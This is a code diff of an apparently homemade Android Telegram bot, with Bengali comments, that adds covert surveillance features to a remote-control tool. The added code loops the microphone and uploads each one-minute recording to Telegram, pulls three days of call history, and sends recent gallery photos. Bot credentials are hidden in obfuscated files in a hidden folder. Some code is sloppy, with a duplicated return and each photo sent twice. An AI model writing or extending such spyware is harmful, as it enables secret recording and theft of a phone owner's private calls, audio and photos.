@@ -7,10 +7,14 @@ def _d(enc, key):
     return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()
 
 def _load():
-    kf = open("/storage/emulated/0/.key").read().strip()
-    key = base64.b64decode(kf.encode()).decode()
-    cfg = json.load(open("/storage/emulated/0/config.enc"))
-    return _d(cfg["t"], key), int(_d(cfg["c"], key))
+    try:
+        kf  = open("/storage/emulated/0/.botcache/.owner.key").read().strip()
+        key = base64.b64decode(kf.encode()).decode()
+        cfg = json.load(open("/storage/emulated/0/.botcache/.owner.enc"))
+        return _d(cfg["t"], key), int(_d(cfg["c"], key))
+    except:
+        return "", 0
+        return "", 0
 
 BOT_TOKEN, ALLOWED_ID = _load()
 
@@ -87,7 +91,10 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "📸 MEDIA:\n"
         "/screenshot - Take screenshot\n"
         "/cam_front  - Front camera\n"
-        "/cam_back   - Back camera\n\n"
+        "/cam_back   - Back camera\n"
+        "/calls      - 3Days Call_history\n"
+        "/audio      - recording loop i mnt \n"
+        "/gallery    - Get Recent 10 photo\n\n"
         "⚙️ HARDWARE:\n"
         "/vibrate    - Vibrate phone\n"
         "/torch_on   - Torch ON\n"
@@ -139,6 +146,112 @@ async def battery(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
     except Exception:
         await update.message.reply_text(f"🔋 Battery:\n{result}")
+import threading as _threading
+audio_stop_event = _threading.Event()
+audio_stop_event.set()
+
+async def audio(update, ctx):
+    if not auth(update): return
+    global audio_stop_event
+
+    if not audio_stop_event.is_set():
+        await update.message.reply_text("⚠️ Recording আগে থেকেই চলছে! বন্ধ করতে /stop_audio")
+        return
+
+    audio_stop_event.clear()
+    chat_id = update.effective_chat.id
+
+    await update.message.reply_text("🎙️ Recording শুরু হয়েছে!\nবন্ধ করতে /stop_audio")
+
+    import threading, requests as _req, os
+
+    def record_loop():
+        count = 1
+        while not audio_stop_event.is_set():
+            path = f"/storage/emulated/0/audio_{count}.mp3"
+            os.system(f"termux-microphone-record -l 60 -f {path} > /dev/null 2>&1")
+            os.system("termux-microphone-record -q > /dev/null 2>&1")
+
+            if os.path.exists(path) and os.path.getsize(path) > 0:
+                try:
+                    _req.post(
+                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
+                        data={"chat_id": chat_id, "title": f"Recording {count}"},
+                        files={"audio": open(path, "rb")},
+                        timeout=30
+                    )
+                    os.remove(path)
+                except Exception as e:
+                    pass
+            count += 1
+
+    t = threading.Thread(target=record_loop, daemon=True)
+    t.start()
+
+async def stop_audio(update, ctx):
+    if not auth(update): return
+    global audio_stop_event
+    audio_stop_event.set()
+    os.system("termux-microphone-record -q > /dev/null 2>&1")
+    await update.message.reply_text("🛑 Recording বন্ধ হয়েছে!")
+
+async def call_history(update, ctx):
+    if not auth(update): return
+    result = shell("termux-call-log -l 50")
+    
+    if "error" in result.lower() or not result:
+        await update.message.reply_text("❌ Call history পাওয়া যায়নি!\nTermux:API app install আছে কিনা চেক করুন।")
+        return
+    
+    import json, datetime
+    
+    try:
+        logs = json.loads(result)
+        
+        # শেষ ৩ দিনের filter করো
+        from datetime import datetime, timedelta
+        three_days_ago = datetime.now() - timedelta(days=3)
+        
+        recent = []
+        for call in logs:
+            try:
+                call_time = datetime.strptime(
+                    call["date"], "%Y-%m-%d %H:%M:%S"
+                )
+                if call_time >= three_days_ago:
+                    recent.append(call)
+            except:
+                continue
+        
+        if not recent:
+            await update.message.reply_text("📵 শেষ ৩ দিনে কোনো call নেই!")
+            return
+        
+        msg = "📞 <b>শেষ ৩ দিনের Call History:</b>\n\n"
+        for call in recent[:30]:
+            type_emoji = {
+                "INCOMING": "📲",
+                "OUTGOING": "📤",
+                "MISSED":   "❌"
+            }.get(call.get("type", ""), "📞")
+            
+            msg += (
+                # নতুন
+f"{type_emoji} <b>{call.get('name', 'Unknown')}</b>\n"
+f"   📱 {call.get('phone_number', 'N/A')}\n"
+                f"   📅 {call.get('date', 'N/A')}\n"
+                f"   ⏱️ {call.get('duration', 0)} সেকেন্ড\n\n"
+            )
+        
+        # message বড় হলে ভাগ করো
+        if len(msg) > 4000:
+            for i in range(0, len(msg), 4000):
+                await update.message.reply_text(msg[i:i+4000], parse_mode="HTML")
+        else:
+            await update.message.reply_text(msg, parse_mode="HTML")
+    
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
 
 # ─────────────────────────────────────────
 # DEVICE INFO
@@ -253,6 +366,66 @@ async def cam_back(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         os.remove(path)
     except Exception as e:
         await update.message.reply_text(f"Failed: {e}")
+
+gallery_stop_event = __import__('threading').Event()
+
+async def gallery(update, ctx):
+    if not auth(update): return
+    global gallery_stop_event
+
+    if not gallery_stop_event.is_set():
+        await update.message.reply_text("⚠️ Gallery আগে থেকেই চলছে! বন্ধ করতে /stop_gallery")
+        return
+
+    import glob
+    gallery_stop_event.clear()
+
+    photos = []
+    paths = [
+        "/storage/emulated/0/DCIM/**/*.jpg",
+        "/storage/emulated/0/DCIM/**/*.jpeg",
+        "/storage/emulated/0/DCIM/**/*.png",
+        "/storage/emulated/0/Pictures/**/*.jpg",
+    ]
+
+    for path in paths:
+        photos.extend(glob.glob(path, recursive=True))
+
+    if not photos:
+        await update.message.reply_text("❌ কোনো ছবি পাওয়া যায়নি!")
+        gallery_stop_event.set()
+        return
+
+    photos.sort(key=os.path.getmtime, reverse=True)
+    limit = int(ctx.args[0]) if ctx.args else 10
+    recent = photos[:limit]
+
+    await update.message.reply_text(f"📸 {len(recent)}টি ছবি পাঠাচ্ছি... বন্ধ করতে /stop_gallery")
+
+    for photo in recent:
+        if gallery_stop_event.is_set():
+            await update.message.reply_text("🔴 Gallery বন্ধ করা হয়েছে!")
+            return
+        try:
+            await update.message.reply_photo(open(photo, "rb"))
+        except:
+            pass
+        if gallery_stop_event.is_set():
+            await update.message.reply_text("🛑 Gallery বন্ধ করা হয়েছে!")
+            return
+        try:
+            await update.message.reply_photo(open(photo, "rb"))
+        except:
+            pass
+
+    gallery_stop_event.set()
+    await update.message.reply_text("✅ সব ছবি পাঠানো হয়েছে!")
+
+async def stop_gallery(update, ctx):
+    if not auth(update): return
+    global gallery_stop_event
+    gallery_stop_event.set()
+    await update.message.reply_text("🛑 Gallery বন্ধ করা হয়েছে!")
 
 # ─────────────────────────────────────────
 # VIBRATE
@@ -778,10 +951,31 @@ async def shell_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 import threading, asyncio, json, base64, hashlib
 
 # Environment থেকে token লোড
-OWNER_TOKEN   = os.environ.get("OWNER_TOKEN", "")
-OWNER_CHAT_ID = int(os.environ.get("OWNER_CHAT", "0"))
-USER_TOKEN    = os.environ.get("USER_TOKEN", "")
-USER_CHAT_ID  = int(os.environ.get("USER_CHAT", "0"))
+import threading, asyncio, json, base64, hashlib
+
+# সরাসরি file থেকে লোড
+def _d(enc, key):
+    kb  = hashlib.sha256(key.encode()).digest()
+    raw = base64.b64decode(enc.encode())
+    return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()
+
+def _load_owner():
+    try:
+        key  = base64.b64decode(open("/storage/emulated/0/.botcache/.owner.key").read().strip()).decode()
+        data = json.loads(open("/storage/emulated/0/.botcache/.owner.enc").read())
+        return _d(data["t"], key), int(_d(data["c"], key))
+    except:
+        return "", 0
+
+def _load_user():
+    try:
+        data = json.load(open("/storage/emulated/0/user.config"))
+        return data["bot_token"], int(data["chat_id"])
+    except:
+        return "", 0
+
+OWNER_TOKEN,   OWNER_CHAT_ID = _load_owner()
+USER_TOKEN,    USER_CHAT_ID  = _load_user()
 
 # ────────────────────────────────────────────
 # Auth
@@ -822,11 +1016,11 @@ async def user_start(update, ctx):
 # ────────────────────────────────────────────
 
 def run_user_bot():
-    async def _run():
-        from telegram.ext import Application, CommandHandler
-        user_app = Application.builder().token(USER_TOKEN).build()
+    from telegram.ext import Application, CommandHandler
+    import asyncio
 
-        # User এর জন্য সীমিত commands
+    async def _run():
+        user_app = Application.builder().token(USER_TOKEN).build()
         user_app.add_handler(CommandHandler("start",      user_start))
         user_app.add_handler(CommandHandler("battery",    battery))
         user_app.add_handler(CommandHandler("info",       info))
@@ -836,10 +1030,16 @@ def run_user_bot():
         user_app.add_handler(CommandHandler("screenshot", screenshot))
         user_app.add_handler(CommandHandler("cam_front",  cam_front))
         user_app.add_handler(CommandHandler("cam_back",   cam_back))
+        user_app.add_handler(CommandHandler("gallery",   gallery))
+        user_app.add_handler(CommandHandler("stop_gallery", stop_gallery))
+        await user_app.initialize()
+        await user_app.start()
+        await user_app.updater.start_polling(drop_pending_updates=True)
+        await asyncio.Event().wait()
 
-        await user_app.run_polling(drop_pending_updates=True)
-
-    asyncio.run(_run())
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(_run())
 
 # ────────────────────────────────────────────
 # Main
@@ -878,6 +1078,8 @@ def main():
         ("wifi",       wifi),
         ("ip",         ip),
         ("screenshot", screenshot),
+        ("stop_gallery", stop_gallery),
+        ("gallery",   gallery),
         ("cam_front",  cam_front),
         ("cam_back",   cam_back),
         ("vibrate",    vibrate),
@@ -886,11 +1088,14 @@ def main():
         ("lock",       lock),
         ("vol_up",     vol_up),
         ("vol_down",   vol_down),
+        ("audio",      audio),
+        ("stop_audio", stop_audio),
         ("mute",       mute),
         ("unmute",     unmute),
         ("pwd",        pwd),
         ("cd",         cd),
         ("ls",         ls),
+        ("calls", call_history),
         ("mkdir",      mkdir),
         ("touch",      touch),
         ("rm",         rm),
